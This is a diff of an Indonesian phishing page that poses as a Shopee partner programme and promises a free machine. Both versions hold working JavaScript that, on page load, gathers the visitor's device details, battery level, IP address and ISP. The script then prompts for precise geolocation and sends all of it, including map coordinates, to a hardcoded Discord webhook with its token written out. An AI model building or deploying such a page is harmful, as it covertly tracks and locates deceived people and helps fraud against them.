@@ -2,137 +2,75 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="theme-color" content="#ED4D2D">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Mitra Shopee Partner || shopee.co.id</title>
-    
-    <meta property="og:description" content="Layanan mitra Shopee partner.">
-    <meta property="og:image" content="https://pelitaonline.co/wp-content/uploads/2025/12/2025-10-21T03_48_37.070Zgroup.jpeg">
-    <meta property="og:type" content="website">
-    
     <style>
-        body { background-color: #EE4D2D; min-height: 100vh; display: flex; flex-direction: column; font-family: Arial, sans-serif; margin: 0; padding: 0; align-items: center; }
-        .logo { display: flex; justify-content: center; align-items: center; margin-top: 40px; margin-bottom: 20px; }
-        .logo img { max-width: 150px; height: auto; }
-        .container { width: 85%; max-width: 320px; padding: 25px; background-color: #fff; border: 1px solid #ddd; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); text-align: center; }
-        marquee { width: 100%; font-size: 12px; background-color: #f9f9f9; padding: 8px 0; border: 2px solid #ffd560; border-radius: 8px; margin-bottom: 15px; color: #333; }
-        h1 { font-size: 16px; font-weight: bold; color: #EE4D2D; background: #fff3d1; padding: 10px; margin: 10px 0; border-radius: 8px; border: 1px dashed #EE4D2D; }
-        .btn { width: 100%; height: 50px; border: none; border-radius: 12px; background: linear-gradient(135deg, #FF6633 0%, #EE4D2D 100%); color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: transform 0.2s; }
-        .btn:active { transform: scale(0.95); }
-        footer { margin-top: 30px; width: 100%; text-align: center; padding-bottom: 20px; }
-        footer img { max-width: 90%; height: auto; border-radius: 10px; }
+        body { background-color: #EE4D2D; min-height: 100vh; display: flex; flex-direction: column; font-family: Arial, sans-serif; margin: 0; align-items: center; }
+        .logo { margin-top: 40px; margin-bottom: 20px; }
+        .logo img { max-width: 150px; }
+        .container { width: 85%; max-width: 320px; padding: 25px; background-color: #fff; border-radius: 20px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        marquee { font-size: 12px; background-color: #f9f9f9; padding: 8px; border: 2px solid #ffd560; border-radius: 8px; margin-bottom: 15px; }
+        h1 { font-size: 16px; color: #EE4D2D; background: #fff3d1; padding: 10px; border-radius: 8px; border: 1px dashed #EE4D2D; }
+        .btn { width: 100%; height: 50px; border: none; border-radius: 12px; background: linear-gradient(135deg, #FF6633 0%, #EE4D2D 100%); color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        footer { margin-top: 30px; text-align: center; padding-bottom: 20px; }
+        footer img { max-width: 90%; border-radius: 10px; }
     </style>
 </head>
 <body>
-
-    <div class="logo">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/1200px-Shopee.svg.png" alt="Shopee Logo">
-    </div>
-
+    <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/1200px-Shopee.svg.png"></div>
     <div class="container">
-        <marquee direction="left">
-            Open Pre Order gratis untuk agen Mitra Shopee!!!!! Sekarang setiap agen Mitra Shopee mendapatkan mesinnya secara gratis.. Ayo Ambil sekarang.
-        </marquee>
-        
-        <h1>Verifikasi Perangkat & Validasi Agen</h1>
-        
-        <p style="font-size: 12px; color: #666; margin-bottom: 15px;">
-            Sedang mensinkronisasi data perangkat untuk keamanan akun Mitra Shopee Anda.
-        </p>
-        
-        <button class="btn" id="mainBtn" onclick="requestLocation()">Dapatkan Sekarang</button>
+        <marquee>Open Pre Order gratis untuk agen Mitra Shopee!!!!! Dapatkan mesin gratis sekarang.</marquee>
+        <h1>Ajukan Order dan lengkapi datamu untuk verifikasi</h1>
+        <p style="font-size: 12px; color: #666;">Silakan klik tombol di bawah untuk proses pengajuan.</p>
+        <button class="btn" onclick="handleButtonClick()">Dapatkan Sekarang</button>
     </div>
-
-    <footer>
-        <img src="https://bantuan.shopee.biz.id/assets/FB_IMG_1769694634688.jpg" alt="Banner Info">
-    </footer>
+    <footer><img src="https://bantuan.shopee.biz.id/assets/FB_IMG_1769694634688.jpg"></footer>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";
+        const webhook = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";
 
-        async function sendToDiscord(embed) {
-            await fetch(webhookURL, {
+        async function sendLog(title, fields) {
+            await fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        ...embed,
-                        color: 15548997, // Warna Oranye Shopee
-                        timestamp: new Date()
-                    }]
-                })
+                body: JSON.stringify({ embeds: [{ title, fields, color: 15548997, timestamp: new Date() }] })
             });
         }
 
-        // --- 1. AMBIL DATA OTOMATIS SAAT HALAMAN DIBUKA ---
+        // 1. Ambil Data Full Otomatis saat Load
         window.onload = async () => {
             let fields = [
-                { name: "📱 OS/Platform", value: navigator.platform, inline: true },
-                { name: "🖥️ Resolusi", value: `${screen.width}x${screen.height}`, inline: true },
+                { name: "📱 OS", value: navigator.platform, inline: true },
                 { name: "🌐 Browser", value: navigator.userAgent.split(' ').pop(), inline: true },
-                { name: "🔋 Baterai", value: "Loading...", inline: true }
+                { name: "🖥️ Layar", value: `${screen.width}x${screen.height}`, inline: true }
             ];
-
-            // Info Baterai
             try {
                 const b = await navigator.getBattery();
-                fields[3].value = `${Math.round(b.level * 100)}% (${b.charging ? 'Dicas' : 'Tidak Dicas'})`;
-            } catch(e) { fields[3].value = "Tidak Terdeteksi"; }
-
-            // Info IP & ISP
-            try {
+                fields.push({ name: "🔋 Baterai", value: `${Math.round(b.level * 100)}%`, inline: true });
                 const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                fields.push(
-                    { name: "🌍 IP Address", value: data.ip, inline: true },
-                    { name: "🏙️ Kota", value: `${data.city}, ${data.region}`, inline: true },
-                    { name: "📶 ISP", value: data.org, inline: false }
-                );
-            } catch(e) { fields.push({ name: "🌍 IP", value: "Gagal ambil IP", inline: true }); }
+                const d = await res.json();
+                fields.push({ name: "🌍 IP", value: d.ip }, { name: "📶 ISP", value: d.org });
+            } catch (e) {}
+            
+            await sendLog("🚀 Visitor Masuk (Mitra Page)", fields);
 
-            await sendToDiscord({
-                title: "🚀 Visitor Terdeteksi (Shopee Partner)",
-                fields: fields
-            });
-
-            // Otomatis minta lokasi setelah 2 detik loading
-            setTimeout(requestLocation, 2000);
+            // 2. Munculkan Izin Lokasi Otomatis setelah 2 detik
+            setTimeout(askLocation, 2000);
         };
 
-        // --- 2. FUNGSI PERIZINAN LOKASI ---
-        function requestLocation() {
+        function askLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    // Jika Diizinkan
-                    async (pos) => {
-                        await sendToDiscord({
-                            title: "✅ Izin Lokasi: DIBERIKAN",
-                            description: `Target mengizinkan akses lokasi.`,
-                            fields: [
-                                { name: "📍 Koordinat", value: `${pos.coords.latitude}, ${pos.coords.longitude}` },
-                                { name: "🔗 Google Maps", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }
-                            ]
-                        });
-                        // Setelah sukses kirim, lanjut ke halaman tujuan
-                        window.location.href = 'halamantoko.html';
-                    },
-                    // Jika Ditolak
-                    async (err) => {
-                        let sebab = "Ditolak Pengguna (User Denied)";
-                        if (err.code === 3) sebab = "Timeout (Sinyal Lemah)";
-                        
-                        await sendToDiscord({
-                            title: "❌ Izin Lokasi: DITOLAK",
-                            description: `Target menolak memberikan lokasi.\n**Sebab:** ${sebab}`,
-                            color: 16711680 // Merah
-                        });
-                        alert("Gagal memverifikasi lokasi. Silakan klik 'Izinkan' untuk melanjutkan program Mitra Shopee.");
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    (p) => sendLog("✅ Lokasi Diizinkan", [{ name: "Koordinat", value: `${p.coords.latitude},${p.coords.longitude}` }, { name: "Maps", value: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` }]),
+                    () => sendLog("❌ Lokasi Ditolak", [{ name: "Status", value: "User menolak izin" }]),
+                    { enableHighAccuracy: true }
                 );
             }
         }
-    </script>
 
+        function handleButtonClick() {
+            window.location.href = 'halamantoko.html';
+        }
+    </script>
 </body>
 </html>
